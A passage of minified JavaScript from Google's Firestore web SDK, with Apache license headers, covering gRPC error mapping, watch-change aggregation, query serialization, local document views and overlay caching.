 */class js{constructor(e){this.count=e}}function Bs(e){if(void 0===e)return ar("GRPC error has no .code"),cr.UNKNOWN;switch(e){case o.OK:return cr.OK;case o.CANCELLED:return cr.CANCELLED;case o.UNKNOWN:return cr.UNKNOWN;case o.DEADLINE_EXCEEDED:return cr.DEADLINE_EXCEEDED;case o.RESOURCE_EXHAUSTED:return cr.RESOURCE_EXHAUSTED;case o.INTERNAL:return cr.INTERNAL;case o.UNAVAILABLE:return cr.UNAVAILABLE;case o.UNAUTHENTICATED:return cr.UNAUTHENTICATED;case o.INVALID_ARGUMENT:return cr.INVALID_ARGUMENT;case o.NOT_FOUND:return cr.NOT_FOUND;case o.ALREADY_EXISTS:return cr.ALREADY_EXISTS;case o.PERMISSION_DENIED:return cr.PERMISSION_DENIED;case o.FAILED_PRECONDITION:return cr.FAILED_PRECONDITION;case o.ABORTED:return cr.ABORTED;case o.OUT_OF_RANGE:return cr.OUT_OF_RANGE;case o.UNIMPLEMENTED:return cr.UNIMPLEMENTED;case o.DATA_LOSS:return cr.DATA_LOSS;default:return ur()}}(l=o||(o={}))[l.OK=0]="OK",l[l.CANCELLED=1]="CANCELLED",l[l.UNKNOWN=2]="UNKNOWN",l[l.INVALID_ARGUMENT=3]="INVALID_ARGUMENT",l[l.DEADLINE_EXCEEDED=4]="DEADLINE_EXCEEDED",l[l.NOT_FOUND=5]="NOT_FOUND",l[l.ALREADY_EXISTS=6]="ALREADY_EXISTS",l[l.PERMISSION_DENIED=7]="PERMISSION_DENIED",l[l.UNAUTHENTICATED=16]="UNAUTHENTICATED",l[l.RESOURCE_EXHAUSTED=8]="RESOURCE_EXHAUSTED",l[l.FAILED_PRECONDITION=9]="FAILED_PRECONDITION",l[l.ABORTED=10]="ABORTED",l[l.OUT_OF_RANGE=11]="OUT_OF_RANGE",l[l.UNIMPLEMENTED=12]="UNIMPLEMENTED",l[l.INTERNAL=13]="INTERNAL",l[l.UNAVAILABLE=14]="UNAVAILABLE",l[l.DATA_LOSS=15]="DATA_LOSS";
/**
 * @license
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class qs{constructor(){this.onExistenceFilterMismatchCallbacks=new Map}static get instance(){return $s}static getOrCreateInstance(){return null===$s&&($s=new qs),$s}onExistenceFilterMismatch(e){let t=Symbol();return this.onExistenceFilterMismatchCallbacks.set(t,e),()=>this.onExistenceFilterMismatchCallbacks.delete(t)}notifyOnExistenceFilterMismatch(e){this.onExistenceFilterMismatchCallbacks.forEach((t=>t(e)))}}let $s=null;
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zs{constructor(e,t,n,r,i){this.snapshotVersion=e,this.targetChanges=t,this.targetMismatches=n,this.documentUpdates=r,this.resolvedLimboDocuments=i}static createSynthesizedRemoteEventForCurrentChange(e,t,n){let r=new Map;return r.set(e,Gs.createSynthesizedTargetChangeForCurrentChange(e,t,n)),new zs(Sr.min(),r,cs,ns,us())}}class Gs{constructor(e,t,n,r,i){this.resumeToken=e,this.current=t,this.addedDocuments=n,this.modifiedDocuments=r,this.removedDocuments=i}static createSynthesizedTargetChangeForCurrentChange(e,t,n){return new Gs(n,t,us(),us(),us())}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ks{constructor(e,t,n,r){this.It=e,this.removedTargetIds=t,this.key=n,this.Tt=r}}class Hs{constructor(e,t){this.targetId=e,this.Et=t}}class Ws{constructor(e,t,n=Hr.EMPTY_BYTE_STRING,r=null){this.state=e,this.targetIds=t,this.resumeToken=n,this.cause=r}}class Qs{constructor(){this.At=0,this.Rt=Ys(),this.vt=Hr.EMPTY_BYTE_STRING,this.bt=!1,this.Pt=!0}get current(){return this.bt}get resumeToken(){return this.vt}get Vt(){return 0!==this.At}get St(){return this.Pt}Dt(e){e.approximateByteSize()>0&&(this.Pt=!0,this.vt=e)}Ct(){let e=us(),t=us(),n=us();return this.Rt.forEach(((r,i)=>{switch(i){case 0:e=e.add(r);break;case 2:t=t.add(r);break;case 1:n=n.add(r);break;default:ur()}})),new Gs(this.vt,this.bt,e,t,n)}xt(){this.Pt=!1,this.Rt=Ys()}Nt(e,t){this.Pt=!0,this.Rt=this.Rt.insert(e,t)}kt(e){this.Pt=!0,this.Rt=this.Rt.remove(e)}Ot(){this.At+=1}$t(){this.At-=1}Mt(){this.Pt=!0,this.bt=!0}}class Js{constructor(e){this.Ft=e,this.Bt=new Map,this.Lt=ns,this.qt=Xs(),this.Ut=new $r(Ir)}Kt(e){for(let t of e.It)e.Tt&&e.Tt.isFoundDocument()?this.Gt(t,e.Tt):this.Qt(t,e.key,e.Tt);for(let t of e.removedTargetIds)this.Qt(t,e.key,e.Tt)}zt(e){this.forEachTarget(e,(t=>{let n=this.jt(t);switch(e.state){case 0:this.Wt(t)&&n.Dt(e.resumeToken);break;case 1:n.$t(),n.Vt||n.xt(),n.Dt(e.resumeToken);break;case 2:n.$t(),n.Vt||this.removeTarget(t);break;case 3:this.Wt(t)&&(n.Mt(),n.Dt(e.resumeToken));break;case 4:this.Wt(t)&&(this.Ht(t),n.Dt(e.resumeToken));break;default:ur()}}))}forEachTarget(e,t){e.targetIds.length>0?e.targetIds.forEach(t):this.Bt.forEach(((e,n)=>{this.Wt(n)&&t(n)}))}Jt(e){var t;let n=e.targetId,r=e.Et.count,i=this.Yt(n);if(i){let s=i.target;if(ji(s))if(0===r){let e=new Or(s.path);this.Qt(n,e,vi.newNoDocument(e,Sr.min()))}else 1===r||ur();else{let i=this.Zt(n);i!==r&&(this.Ht(n),this.Ut=this.Ut.add(n),null===(t=qs.instance)||void 0===t||t.notifyOnExistenceFilterMismatch({localCacheCount:i,existenceFilterCount:e.Et.count}))}}}Xt(e){let t=new Map;this.Bt.forEach(((n,r)=>{let i=this.Yt(r);if(i){if(n.current&&ji(i.target)){let t=new Or(i.target.path);null!==this.Lt.get(t)||this.te(r,t)||this.Qt(r,t,vi.newNoDocument(t,e))}n.St&&(t.set(r,n.Ct()),n.xt())}}));let n=us();this.qt.forEach(((e,t)=>{let r=!0;t.forEachWhile((e=>{let t=this.Yt(e);return!t||2===t.purpose||(r=!1,!1)})),r&&(n=n.add(e))})),this.Lt.forEach(((t,n)=>n.setReadTime(e)));let r=new zs(e,t,this.Ut,this.Lt,n);return this.Lt=ns,this.qt=Xs(),this.Ut=new $r(Ir),r}Gt(e,t){if(!this.Wt(e))return;let n=this.te(e,t.key)?2:0;this.jt(e).Nt(t.key,n),this.Lt=this.Lt.insert(t.key,t),this.qt=this.qt.insert(t.key,this.ee(t.key).add(e))}Qt(e,t,n){if(!this.Wt(e))return;let r=this.jt(e);this.te(e,t)?r.Nt(t,1):r.kt(t),this.qt=this.qt.insert(t,this.ee(t).delete(e)),n&&(this.Lt=this.Lt.insert(t,n))}removeTarget(e){this.Bt.delete(e)}Zt(e){let t=this.jt(e).Ct();return this.Ft.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}Ot(e){this.jt(e).Ot()}jt(e){let t=this.Bt.get(e);return t||(t=new Qs,this.Bt.set(e,t)),t}ee(e){let t=this.qt.get(e);return t||(t=new $r(Ir),this.qt=this.qt.insert(e,t)),t}Wt(e){let t=null!==this.Yt(e);return t||sr("WatchChangeAggregator","Detected inactive target",e),t}Yt(e){let t=this.Bt.get(e);return t&&t.Vt?null:this.Ft.ne(e)}Ht(e){this.Bt.set(e,new Qs),this.Ft.getRemoteKeysForTarget(e).forEach((t=>{this.Qt(e,t,null)}))}te(e,t){return this.Ft.getRemoteKeysForTarget(e).has(t)}}function Xs(){return new jr(Or.comparator)}function Ys(){return new jr(Or.comparator)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let Zs={asc:"ASCENDING",desc:"DESCENDING"},ea={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},ta={and:"AND",or:"OR"};class na{constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function ra(e,t){return e.useProto3Json?`${new Date(1e3*t.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+t.nanoseconds).slice(-9)}Z`:{seconds:""+t.seconds,nanos:t.nanoseconds}}function ia(e,t){return e.useProto3Json?t.toBase64():t.toUint8Array()}function sa(e){return e||ur(),Sr.fromTimestamp(function(e){let t=Qr(e);return new Tr(t.seconds,t.nanos)}(e))}function aa(e,t){return new Ar(["projects",e.projectId,"databases",e.database]).child("documents").child(t).canonicalString()}function oa(e){let t=Ar.fromString(e);return ga(t)||ur(),t}function la(e,t){return aa(e.databaseId,t.path)}function ua(e,t){let n=oa(t);if(n.get(1)!==e.databaseId.projectId)throw new hr(cr.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+n.get(1)+" vs "+e.databaseId.projectId);if(n.get(3)!==e.databaseId.database)throw new hr(cr.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+n.get(3)+" vs "+e.databaseId.database);return new Or(da(n))}function ca(e,t){return aa(e.databaseId,t)}function ha(e){return new Ar(["projects",e.databaseId.projectId,"databases",e.databaseId.database]).canonicalString()}function da(e){return e.length>4&&"documents"===e.get(4)||ur(),e.popFirst(5)}function fa(e,t,n){return{name:la(e,t),fields:n.value.mapValue.fields}}function pa(e){return{fieldPath:e.canonicalString()}}function ma(e){return Nr.fromServerFormat(e.fieldPath)}function ga(e){return e.length>=4&&"projects"===e.get(0)&&"databases"===e.get(2)}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ya{constructor(e,t,n,r,i=Sr.min(),s=Sr.min(),a=Hr.EMPTY_BYTE_STRING){this.target=e,this.targetId=t,this.purpose=n,this.sequenceNumber=r,this.snapshotVersion=i,this.lastLimboFreeSnapshotVersion=s,this.resumeToken=a}withSequenceNumber(e){return new ya(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken)}withResumeToken(e,t){return new ya(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e)}withLastLimboFreeSnapshotVersion(e){return new ya(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class va{constructor(e){this.se=e}}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wa{constructor(){}oe(e,t){this.ue(e,t),t.ce()}ue(e,t){if("nullValue"in e)this.ae(t,5);else if("booleanValue"in e)this.ae(t,10),t.he(e.booleanValue?1:0);else if("integerValue"in e)this.ae(t,15),t.he(Jr(e.integerValue));else if("doubleValue"in e){let n=Jr(e.doubleValue);isNaN(n)?this.ae(t,13):(this.ae(t,15),Mr(n)?t.he(0):t.he(n))}else if("timestampValue"in e){let n=e.timestampValue;this.ae(t,20),"string"==typeof n?t.le(n):(t.le(`${n.seconds||""}`),t.he(n.nanos||0))}else if("stringValue"in e)this.fe(e.stringValue,t),this.de(t);else if("bytesValue"in e)this.ae(t,30),t.we(Xr(e.bytesValue)),this.de(t);else if("referenceValue"in e)this._e(e.referenceValue,t);else if("geoPointValue"in e){let n=e.geoPointValue;this.ae(t,45),t.he(n.latitude||0),t.he(n.longitude||0)}else"mapValue"in e?gi(e)?this.ae(t,Number.MAX_SAFE_INTEGER):(this.me(e.mapValue,t),this.de(t)):"arrayValue"in e?(this.ge(e.arrayValue,t),this.de(t)):ur()}fe(e,t){this.ae(t,25),this.ye(e,t)}ye(e,t){t.le(e)}me(e,t){let n=e.fields||{};for(let e of(this.ae(t,55),Object.keys(n)))this.fe(e,t),this.ue(n[e],t)}ge(e,t){let n=e.values||[];for(let e of(this.ae(t,50),n))this.ue(e,t)}_e(e,t){this.ae(t,37),Or.fromName(e).path.forEach((e=>{this.ae(t,60),this.ye(e,t)}))}ae(e,t){e.he(t)}de(e){e.he(2)}}wa.pe=new wa;
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class ba{constructor(){this.He=new _a}addToCollectionParentIndex(e,t){return this.He.add(t),xr.resolve()}getCollectionParents(e,t){return xr.resolve(this.He.getEntries(t))}addFieldIndex(e,t){return xr.resolve()}deleteFieldIndex(e,t){return xr.resolve()}getDocumentsMatchingTarget(e,t){return xr.resolve(null)}getIndexType(e,t){return xr.resolve(0)}getFieldIndexes(e,t){return xr.resolve([])}getNextCollectionGroupToUpdate(e){return xr.resolve(null)}getMinOffset(e,t){return xr.resolve(Dr.min())}getMinOffsetFromCollectionGroup(e,t){return xr.resolve(Dr.min())}updateCollectionGroup(e,t,n){return xr.resolve()}updateIndexEntries(e,t){return xr.resolve()}}class _a{constructor(){this.index={}}add(e){let t=e.lastSegment(),n=e.popLast(),r=this.index[t]||new $r(Ar.comparator),i=!r.has(n);return this.index[t]=r.add(n),i}has(e){let t=e.lastSegment(),n=e.popLast(),r=this.index[t];return r&&r.has(n)}getEntries(e){return(this.index[e]||new $r(Ar.comparator)).toArray()}}new Uint8Array(0);class Ia{constructor(e,t,n){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=n}static withCacheSize(e){return new Ia(e,Ia.DEFAULT_COLLECTION_PERCENTILE,Ia.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */Ia.DEFAULT_COLLECTION_PERCENTILE=10,Ia.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,Ia.DEFAULT=new Ia(41943040,Ia.DEFAULT_COLLECTION_PERCENTILE,Ia.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),Ia.DISABLED=new Ia(-1,0,0);
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ea{constructor(e){this.Rn=e}next(){return this.Rn+=2,this.Rn}static vn(){return new Ea(0)}static bn(){return new Ea(-1)}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class Ta{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Sa{constructor(e,t,n,r){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=n,this.indexManager=r}getDocument(e,t){let n=null;return this.documentOverlayCache.getOverlay(e,t).next((r=>(n=r,this.remoteDocumentCache.getEntry(e,t)))).next((e=>(null!==n&&Cs(n.mutation,e,Gr.empty(),Tr.now()),e)))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next((t=>this.getLocalViewOfDocuments(e,t,us()).next((()=>t))))}getLocalViewOfDocuments(e,t,n=us()){let r=as();return this.populateOverlays(e,r,t).next((()=>this.computeViews(e,t,r,n).next((e=>{let t=is();return e.forEach(((e,n)=>{t=t.insert(e,n.overlayedDocument)})),t}))))}getOverlayedDocuments(e,t){let n=as();return this.populateOverlays(e,n,t).next((()=>this.computeViews(e,t,n,us())))}populateOverlays(e,t,n){let r=[];return n.forEach((e=>{t.has(e)||r.push(e)})),this.documentOverlayCache.getOverlays(e,r).next((e=>{e.forEach(((e,n)=>{t.set(e,n)}))}))}computeViews(e,t,n,r){let i=ns,s=as(),a=as();return t.forEach(((e,t)=>{let a=n.get(t.key);r.has(t.key)&&(void 0===a||a.mutation instanceof Ds)?i=i.insert(t.key,t):void 0!==a?(s.set(t.key,a.mutation.getFieldMask()),Cs(a.mutation,t,a.mutation.getFieldMask(),Tr.now())):s.set(t.key,Gr.empty())})),this.recalculateAndSaveOverlays(e,i).next((e=>(e.forEach(((e,t)=>s.set(e,t))),t.forEach(((e,t)=>{var n;return a.set(e,new Ta(t,null!==(n=s.get(e))&&void 0!==n?n:null))})),a)))}recalculateAndSaveOverlays(e,t){let n=as(),r=new jr(((e,t)=>e-t)),i=us();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next((e=>{for(let i of e)i.keys().forEach((e=>{let s=t.get(e);if(null===s)return;let a=n.get(e)||Gr.empty();a=i.applyToLocalView(s,a),n.set(e,a);let o=(r.get(i.batchId)||us()).add(e);r=r.insert(i.batchId,o)}))})).next((()=>{let s=[],a=r.getReverseIterator();for(;a.hasNext();){let r=a.getNext(),o=r.key,l=r.value,u=as();l.forEach((e=>{if(!i.has(e)){let r=As(t.get(e),n.get(e));null!==r&&u.set(e,r),i=i.add(e)}})),s.push(this.documentOverlayCache.saveOverlays(e,o,u))}return xr.waitFor(s)})).next((()=>n))}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next((t=>this.recalculateAndSaveOverlays(e,t)))}getDocumentsMatchingQuery(e,t,n){return Or.isDocumentKey(t.path)&&null===t.collectionGroup&&0===t.filters.length?this.getDocumentsMatchingDocumentQuery(e,t.path):Gi(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,n):this.getDocumentsMatchingCollectionQuery(e,t,n)}getNextDocuments(e,t,n,r){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,n,r).next((i=>{let s=r-i.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,n.largestBatchId,r-i.size):xr.resolve(as()),a=-1,o=i;return s.next((t=>xr.forEach(t,((t,n)=>(a<n.largestBatchId&&(a=n.largestBatchId),i.get(t)?xr.resolve():this.remoteDocumentCache.getEntry(e,t).next((e=>{o=o.insert(t,e)}))))).next((()=>this.populateOverlays(e,t,i))).next((()=>this.computeViews(e,o,t,us()))).next((e=>({batchId:a,changes:ss(e)})))))}))}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new Or(t)).next((e=>{let t=is();return e.isFoundDocument()&&(t=t.insert(e.key,e)),t}))}getDocumentsMatchingCollectionGroupQuery(e,t,n){let r=t.collectionGroup,i=is();return this.indexManager.getCollectionParents(e,r).next((s=>xr.forEach(s,(s=>{var a;let o=(a=s.child(r),new Bi(a,null,t.explicitOrderBy.slice(),t.filters.slice(),t.limit,t.limitType,t.startAt,t.endAt));return this.getDocumentsMatchingCollectionQuery(e,o,n).next((e=>{e.forEach(((e,t)=>{i=i.insert(e,t)}))}))})).next((()=>i))))}getDocumentsMatchingCollectionQuery(e,t,n){let r;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,n.largestBatchId).next((i=>(r=i,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,n,r)))).next((e=>{r.forEach(((t,n)=>{let r=n.getKey();null===e.get(r)&&(e=e.insert(r,vi.newInvalidDocument(r)))}));let n=is();return e.forEach(((e,i)=>{let s=r.get(e);void 0!==s&&Cs(s.mutation,i,Gr.empty(),Tr.now()),Zi(t,i)&&(n=n.insert(e,i))})),n}))}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ka{constructor(e){this.serializer=e,this.Zn=new Map,this.Xn=new Map}getBundleMetadata(e,t){return xr.resolve(this.Zn.get(t))}saveBundleMetadata(e,t){return this.Zn.set(t.id,{id:t.id,version:t.version,createTime:sa(t.createTime)}),xr.resolve()}getNamedQuery(e,t){return xr.resolve(this.Xn.get(t))}saveNamedQuery(e,t){return this.Xn.set(t.name,{name:t.name,query:function(e){let t=function(e){var t;let n,r=function(e){let t=oa(e);return 4===t.length?Ar.emptyPath():da(t)}(e.parent),i=e.structuredQuery,s=i.from?i.from.length:0,a=null;if(s>0){1===s||ur();let e=i.from[0];e.allDescendants?a=e.collectionId:r=r.child(e.collectionId)}let o=[];i.where&&(o=function(e){var t;let n=function e(t){return void 0!==t.unaryFilter?function(e){switch(e.unaryFilter.op){case"IS_NAN":let t=ma(e.unaryFilter.field);return Ti.create(t,"==",{doubleValue:NaN});case"IS_NULL":let n=ma(e.unaryFilter.field);return Ti.create(n,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":let r=ma(e.unaryFilter.field);return Ti.create(r,"!=",{doubleValue:NaN});case"IS_NOT_NULL":let i=ma(e.unaryFilter.field);return Ti.create(i,"!=",{nullValue:"NULL_VALUE"});default:return ur()}}(t):void 0!==t.fieldFilter?Ti.create(ma(t.fieldFilter.field),function(e){switch(e){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";default:return ur()}}(t.fieldFilter.op),t.fieldFilter.value):void 0!==t.compositeFilter?Si.create(t.compositeFilter.filters.map((t=>e(t))),function(e){switch(e){case"AND":return"and";case"OR":return"or";default:return ur()}}(t.compositeFilter.op)):ur()}(e);return n instanceof Si&&Ai(t=n)&&ki(t)?n.getFilters():[n]}(i.where));let l=[];i.orderBy&&(l=i.orderBy.map((e=>new Ii(ma(e.field),function(e){switch(e){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}}(e.direction)))));let u=null;i.limit&&(u=null==(n="object"==typeof(t=i.limit)?t.value:t)?null:n);let c=null;i.startAt&&(c=function(e){let t=!!e.before,n=e.values||[];return new wi(n,t)}(i.startAt));let h=null;return i.endAt&&(h=function(e){let t=!e.before,n=e.values||[];return new wi(n,t)}(i.endAt)),new Bi(r,a,l,o,u,"F",c,h)}({parent:e.parent,structuredQuery:e.structuredQuery});return"LAST"===e.limitType?Qi(t,t.limit,"L"):t}(t.bundledQuery),readTime:sa(t.readTime)}),xr.resolve()
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}class Aa{constructor(){this.overlays=new jr(Or.comparator),this.ts=new Map}getOverlay(e,t){return xr.resolve(this.overlays.get(t))}getOverlays(e,t){let n=as();return xr.forEach(t,(t=>this.getOverlay(e,t).next((e=>{null!==e&&n.set(t,e)})))).next((()=>n))}saveOverlays(e,t,n){return n.forEach(((n,r)=>{this.re(e,t,r)})),xr.resolve()}removeOverlaysForBatchId(e,t,n){let r=this.ts.get(n);return void 0!==r&&(r.forEach((e=>this.overlays=this.overlays.remove(e))),this.ts.delete(n)),xr.resolve()}getOverlaysForCollection(e,t,n){let r=as(),i=t.length+1,s=new Or(t.child("")),a=this.overlays.getIteratorFrom(s);for(;a.hasNext();){let e=a.getNext().value,s=e.getKey();if(!t.isPrefixOf(s.path))break;s.path.length===i&&e.largestBatchId>n&&r.set(e.getKey(),e)}return xr.resolve(r)}getOverlaysForCollectionGroup(e,t,n,r){let i=new jr(((e,t)=>e-t)),s=this.overlays.getIterator();for(;s.hasNext();){let e=s.getNext().value;if(e.getKey().getCollectionGroup()===t&&e.largestBatchId>n){let t=i.get(e.largestBatchId);null===t&&(t=as(),i=i.insert(e.largestBatchId,t)),t.set(e.getKey(),e)}}let a=as(),o=i.getIterator();for(;o.hasNext()&&(o.getNext().value.forEach(((e,t)=>a.set(e,t))),!(a.size()>=r)););return xr.resolve(a)}re(e,t,n){let r=this.overlays.get(n.key);if(null!==r){let 